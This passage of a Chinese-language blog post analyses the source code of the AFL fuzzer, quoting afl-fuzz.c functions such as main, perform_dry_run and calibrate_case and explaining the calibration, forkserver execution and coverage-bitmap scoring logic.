class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:t:T:dnCB:S:M:x:Q&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"> ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  setup_signal_handlers();</span><br><span class="line">  check_asan_opts();</span><br><span class="line">  ...</span><br><span class="line">  save_cmdline(argc, argv);</span><br><span class="line">  fix_up_banner(argv[optind]);</span><br><span class="line">  check_if_tty();</span><br><span class="line">  get_core_count();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  bind_to_free_cpu();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line">  check_crash_handling();</span><br><span class="line">  check_cpu_governor();</span><br><span class="line">  setup_post();</span><br><span class="line">    </span><br><span class="line">  setup_shm();</span><br><span class="line">    </span><br><span class="line">  init_count_class16();</span><br><span class="line">  setup_dirs_fds();</span><br><span class="line">  read_testcases();</span><br><span class="line">  load_auto();</span><br><span class="line">  pivot_inputs();</span><br><span class="line">  <span class="keyword">if</span> (extras_dir) load_extras(extras_dir);</span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) find_timeout();</span><br><span class="line">  detect_file_args(argv + optind + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (!out_file) setup_stdio_file();</span><br><span class="line">  check_binary(argv[optind]);</span><br><span class="line">  start_time = get_cur_time();</span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">    use_argv = get_qemu_argv(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line">  perform_dry_run(use_argv);</span><br><span class="line"></span><br><span class="line">  cull_queue();</span><br><span class="line"></span><br><span class="line">  show_init_stats();</span><br><span class="line"></span><br><span class="line">  seek_to = find_start_position();</span><br><span class="line"></span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  save_auto();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    sleep(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    cull_queue();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      show_stats();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        ACTF(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; getenv(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = fuzz_one(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) show_stats();</span><br><span class="line"></span><br><span class="line">  write_bitmap();</span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  save_auto();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  SAYF(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; get_cur_time() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fclose(plot_file);</span><br><span class="line">  destroy_queue();</span><br><span class="line">  destroy_extras();</span><br><span class="line">  ck_free(target_path);</span><br><span class="line">  ck_free(sync_id);</span><br><span class="line"></span><br><span class="line">  alloc_report();</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="初始准备"><a href="#初始准备" class="headerlink" title="初始准备"></a>初始准备</h1><h2 id="get-opt"><a href="#get-opt" class="headerlink" title="get opt"></a>get opt</h2><p>第一个<code>while</code>循环去获取获取各种环境的设置，选项参数等等。其实就是 <code>alf-fuzz --help</code>里面的内容就不赘述了。</p><p>紧接着会进行一系列检测操作。</p><h2 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h2><p>设置信号句柄</p><h2 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h2><p>保存命令行参数</p><h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>设置共享内存</p><h2 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h2><p>初始化计算代码覆盖率的表单</p><h2 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h2><p>初始化输出文件夹和fd</p><h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h2><p>从输入文件夹中读取所有文件，然后将它们排队进行测试。</p><h2 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h2><p>如果有-t的设置了自己的超时，那么会触发这个函数。</p><h2 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h2><p>识别参数里面有没有<code>@@</code>，如果有就替换为<code>out_dir/.cur_input</code>，如果没有就返回</p><h1 id="dry-run"><a href="#dry-run" class="headerlink" title="dry run"></a>dry run</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_dry_run</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>* <span class="title">q</span> = <span class="title">queue</span>;</span></span><br><span class="line">  u32 cal_failures = <span class="number">0</span>;</span><br><span class="line">  u8* skip_crashes = getenv(<span class="string">&quot;AFL_SKIP_CRASHES&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">...</span><br><span class="line">    u8* fn = <span class="built_in">strrchr</span>(q-&gt;fname, <span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">    ACTF(<span class="string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line">     </span><br><span class="line">    fd = open(q-&gt;fname, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    use_mem = ck_alloc_nozero(q-&gt;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)</span><br><span class="line">      FATAL(<span class="string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    res = calibrate_case(argv, q, use_mem, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    ck_free(use_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (res == crash_mode || res == FAULT_NOBITS)</span><br><span class="line">      SAYF(cGRA <span class="string">&quot;    len = %u, map size = %u, exec speed = %llu us\n&quot;</span> cRST, </span><br><span class="line">           q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (res) &#123;</span><br><span class="line">           ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;var_behavior) WARNF(<span class="string">&quot;Instrumentation output varies across runs.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    q = q-&gt;next;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  OKF(<span class="string">&quot;All test cases processed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 input 文件夹下的预先准备的所有 testcase，生成初始化的 queue 和 bitmap。这只对初始输入执行一次，所以叫：dry run。</p><p>其实就是简单跑一遍所有的 testcase，然后看看有没有什么异常，比如：crash，无法触发新的路径，以确保样本和 target 的正确性。</p><p>然后这里面比较关键的函数是 <code>res = calibrate_case(argv, q, use_mem, 0, 1);</code></p><h2 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">static u8 calibrate_case(char** argv, struct queue_entry* q, u8* use_mem, u32 handicap, u8 from_queue) &#123;</span><br><span class="line">  static u8 first_trace[MAP_SIZE];</span><br><span class="line"></span><br><span class="line">  u8  fault &#x3D; 0, new_bits &#x3D; 0, var_detected &#x3D; 0,</span><br><span class="line">      first_run &#x3D; (q-&gt;exec_cksum &#x3D;&#x3D; 0);</span><br><span class="line"></span><br><span class="line">  u64 start_us, stop_us;</span><br><span class="line"></span><br><span class="line">  s32 old_sc &#x3D; stage_cur, old_sm &#x3D; stage_max;</span><br><span class="line">  u32 use_tmout &#x3D; exec_tmout;</span><br><span class="line">  u8* old_sn &#x3D; stage_name;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Be a bit more generous about timeouts when resuming sessions, or when</span><br><span class="line">     trying to calibrate already-added finds. This helps avoid trouble due</span><br><span class="line">     to intermittent latency. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (!from_queue || resuming_fuzz)</span><br><span class="line">    use_tmout &#x3D; MAX(exec_tmout + CAL_TMOUT_ADD,</span><br><span class="line">                    exec_tmout * CAL_TMOUT_PERC &#x2F; 100);</span><br><span class="line"></span><br><span class="line">  q-&gt;cal_failed++;</span><br><span class="line"></span><br><span class="line">  stage_name &#x3D; &quot;calibration&quot;;</span><br><span class="line">  stage_max  &#x3D; fast_cal ? 3 : CAL_CYCLES;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Make sure the forkserver is up before we do anything, and let&#39;s not</span><br><span class="line">     count its spin-up time toward binary calibration. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (dumb_mode !&#x3D; 1 &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)</span><br><span class="line">    init_forkserver(argv);</span><br><span class="line"></span><br><span class="line">  if (q-&gt;exec_cksum) memcpy(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  start_us &#x3D; get_cur_time_us();</span><br><span class="line"></span><br><span class="line">  for (stage_cur &#x3D; 0; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 cksum;</span><br><span class="line"></span><br><span class="line">    if (!first_run &amp;&amp; !(stage_cur % stats_update_freq)) show_stats();</span><br><span class="line"></span><br><span class="line">    write_to_testcase(use_mem, q-&gt;len);</span><br><span class="line"></span><br><span class="line">    fault &#x3D; run_target(argv, use_tmout);</span><br><span class="line"></span><br><span class="line">    &#x2F;* stop_soon is set by the handler for Ctrl+C. When it&#39;s pressed,</span><br><span class="line">       we want to bail out quickly. *&#x2F;</span><br><span class="line"></span><br><span class="line">    if (stop_soon || fault !&#x3D; crash_mode) goto abort_calibration;</span><br><span class="line"></span><br><span class="line">    if (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;</span><br><span class="line">      fault &#x3D; FAULT_NOINST;</span><br><span class="line">      goto abort_calibration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line"></span><br><span class="line">    if (q-&gt;exec_cksum !&#x3D; cksum) &#123;</span><br><span class="line"></span><br><span class="line">      u8 hnb &#x3D; has_new_bits(virgin_bits);</span><br><span class="line">      if (hnb &gt; new_bits) new_bits &#x3D; hnb;</span><br><span class="line"></span><br><span class="line">      if (q-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        u32 i;</span><br><span class="line"></span><br><span class="line">        for (i &#x3D; 0; i &lt; MAP_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">          if (!var_bytes[i] &amp;&amp; first_trace[i] !&#x3D; trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">            var_bytes[i] &#x3D; 1;</span><br><span class="line">            stage_max    &#x3D; CAL_CYCLES_LONG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var_detected &#x3D; 1;</span><br><span class="line"></span><br><span class="line">      &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        q-&gt;exec_cksum &#x3D; cksum;</span><br><span class="line">        memcpy(first_trace, trace_bits, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop_us &#x3D; get_cur_time_us();</span><br><span class="line"></span><br><span class="line">  total_cal_us     +&#x3D; stop_us - start_us;</span><br><span class="line">  total_cal_cycles +&#x3D; stage_max;</span><br><span class="line"></span><br><span class="line">  &#x2F;* OK, let&#39;s collect some stats about the performance of this test case.</span><br><span class="line">     This is used for fuzzing air time calculations in calculate_score(). *&#x2F;</span><br><span class="line"></span><br><span class="line">  q-&gt;exec_us     &#x3D; (stop_us - start_us) &#x2F; stage_max;</span><br><span class="line">  q-&gt;bitmap_size &#x3D; count_bytes(trace_bits);</span><br><span class="line">  q-&gt;handicap    &#x3D; handicap;</span><br><span class="line">  q-&gt;cal_failed  &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  total_bitmap_size +&#x3D; q-&gt;bitmap_size;</span><br><span class="line">  total_bitmap_entries++;</span><br><span class="line"></span><br><span class="line">  update_bitmap_score(q);</span><br><span class="line"></span><br><span class="line">  &#x2F;* If this case didn&#39;t result in new output from the instrumentation, tell</span><br><span class="line">     parent. This is a non-critical problem, but something to warn the user</span><br><span class="line">     about. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (!dumb_mode &amp;&amp; first_run &amp;&amp; !fault &amp;&amp; !new_bits) fault &#x3D; FAULT_NOBITS;</span><br><span class="line"></span><br><span class="line">abort_calibration:</span><br><span class="line"></span><br><span class="line">  if (new_bits &#x3D;&#x3D; 2 &amp;&amp; !q-&gt;has_new_cov) &#123;</span><br><span class="line">    q-&gt;has_new_cov &#x3D; 1;</span><br><span class="line">    queued_with_cov++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;* Mark variable paths. *&#x2F;</span><br><span class="line"></span><br><span class="line">  if (var_detected) &#123;</span><br><span class="line"></span><br><span class="line">    var_byte_count &#x3D; count_bytes(var_bytes);</span><br><span class="line"></span><br><span class="line">    if (!q-&gt;var_behavior) &#123;</span><br><span class="line">      mark_as_variable(q);</span><br><span class="line">      queued_variable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_name &#x3D; old_sn;</span><br><span class="line">  stage_cur  &#x3D; old_sc;</span><br><span class="line">  stage_max  &#x3D; old_sm;</span><br><span class="line"></span><br><span class="line">  if (!first_run) show_stats();</span><br><span class="line"></span><br><span class="line">  return fault;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>calibrate_case</code>首先也会进行一些初始化操作，比较重要的是要检查一下 <code>fork_server</code>是否已经初始化，如果没有则先初始化 <code>fork_server</code>。每个测试样例都会执行3次或8次，而不是简单的执行一次，执行多次并记录tuple的信息。具体取决于是否快速校准</p><p><code>write_to_testcase()</code> ：将测试样例写入文件。如果 use_stdin 被清除了，那么取消旧文件链接并创建一个新文件。否则，prog_in_fd 将被缩短。将 testcase 写入到文件中去。</p><p><code>run_target()</code>：运行程序，见下文。</p><p><code>hash32(trace_bits, MAP_SIZE, HASH_CONST)</code>：计算trace_bits的checksums，即当前tuple的hash值</p><p><code>if...else</code>：如果是第一次运行则记录<code>cksum</code>的值，下次将该次<code>cksum</code>的值和上一次进行比较，如果相同则忽略，如果不同则调用<code>has_new_bits()</code>和我们的总表<em>virgin_bits</em> 对比。</p><p>后续进行一些信息的记录</p><p><code>update_bitmap_score(q)</code> ：对这个测试用例的每一个byte进行排序，用一个top_rate[]来维护它的最佳入口。维护完成之后，我们这个函数在</p><p><strong>总结：</strong><code>calibratecase</code>该函数主要用途是<code>init_forkserver</code>，检查case的可用性，用update_bitmap_score进行初始的byte排序。</p><h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver()"></a>init_forkserver()</h2><p><a href="https://0xfocu5.github.io/posts/53fcd800/">记录在上一篇文章了</a></p><p><a href="https://0xfocu5.github.io/posts/53fcd800/">https://0xfocu5.github.io/posts/53fcd800/</a></p><h2 id="run-target"><a href="#run-target" class="headerlink" title="run_target()"></a>run_target()</h2><p><code>memset(trace_bits, 0, MAP_SIZE)</code>：清空共享内存</p><ul><li><p>如果是dumb模式：如果dumb_mode等于1，且no_forkserver，则直接fork出一个子进程，然后让子进程execv去执行target，如果execv执行失败，则向trace_bits写入EXEC_FAIL_SIG</p></li><li><p>否则，就向控制管道写入<code>prev_timed_out</code>的值，命令Fork server开始fork出一个子进程进行fuzz，然后从状态管道读取fork server返回的fork出的子进程的ID到<code>child_pid</code></p></li></ul><p>接下来无论那种模式，如果超过用户所设置的超时时间限制，则杀死程序，并设置child_timed_out为1。</p><p>target执行结束，如果是dumb_mode，target执行结束的状态码将直接保存到status中，如果不是dumb_mode，则从状态管道中读取target执行结束的状态码。然后调用<code>classify_counts((u64 *) trace_bits)</code>去更新代码覆盖率。</p><h2 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits()"></a>has_new_bits()</h2><p>检查当前执行路径是否为表带来了新内容。更新原始位以反映发现。如果唯一更改的是特定元组的命中计数，则返回1;如果有新的元组出现，则返回2。更新映射，因此后续调用将始终返回0。<br>这个函数是在相当大的缓冲区上的每个exec()之后调用的，因此它需要非常快。我们以32位和64位的方式做这件事。因此它需要非常快。我们以32位和64位的方式做这件事。</p><h2 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h2><p>当碰到一条新路径时，我们将看这条路径是否比别的存在路径更加有利。“favorables”的目的是拥有一组最小的路径集（testcase）来触发到目前为止在位图中看到的所有位，并专注于fuzz这些testcase，而牺牲了其余的。这个过程的第一步是bitmap中的每个字节维护一个top_rating[]条目列表。</p><ul><li><p>首先计算出这个case的fav_factor，计算方法是<code>q-&gt;exec_us * q-&gt;len</code>即执行时间和样例大小的乘积，以这两个指标来衡量权重。</p></li><li><p>遍历trace_bits数组，如果该字节的值不为0，则代表这是已经被覆盖到的path</p><p>  然后检查对应于这个path的top_rated是否存在</p><ul><li><p><code>static struct queue_entry *top_rated[MAP_SIZE]; /* Top entries for bitmap bytes */</code></p></li><li><p>如果存在，就比较<code>fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len</code>，即比较执行时间和样例大小的乘积，哪个更小。</p><ul><li>如果<code>top_rated[i]</code>的更小，则代表<code>top_rated[i]</code>的更优，不做任何处理，继续遍历下一个path。</li><li>如果q更小，就将<code>top_rated[i]</code>原先对应的queue entry的tc_ref字段减一，并将其trace_mini字段置为空。</li><li><code>u8 *trace_mini; /* Trace bytes, if kept */</code></li><li><code>u32 tc_ref; /* Trace bytes ref count */</code></li></ul></li><li><p>然后设置<code>top_rated[i]</code>为q，即当前case，然后将其tc_ref的值加一</p></li><li><p>如果<code>q-&gt;trace_mini</code>为空，则将trace_bits经过minimize_bits压缩，然后存到trace_mini字段里</p></li><li><p>设置score_changed为1.</p></li></ul></li></ul><h1 id="fuzz循环"><a href="#fuzz循环" 